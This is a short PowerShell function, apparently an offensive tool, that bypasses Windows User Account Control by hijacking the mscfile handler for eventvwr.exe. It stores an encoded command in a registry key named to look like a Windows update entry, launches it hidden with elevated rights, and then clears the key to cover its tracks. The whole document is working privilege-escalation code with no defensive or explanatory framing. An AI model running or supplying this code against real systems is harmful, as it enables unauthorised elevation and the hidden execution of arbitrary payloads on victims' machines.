function BypassUAC-HackPlayers-Eventvwr {  
param ([string]$comando)
New-Item -path registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\Update -force | Out-Null
Set-ItemProperty -path registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\Update -name 'Update' -Value $comando -Force | Out-Null
$comando = 'powershell.exe -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows\Update).Update); powershell -NoP -NonI -W Hidden -enc $x'
New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command -force | out-null
$key = "registry::HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command" 
Set-ItemProperty -Path $key -name '(Default)' -Value $comando -Force | Out-Null
Start-Process eventvwr.exe ; sleep -Seconds 3
New-ItemProperty -Path $key -name '(Default)' -Value "" -PropertyType string -Force | Out-Null
#Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\ ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile 
#Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\Update -Force
}

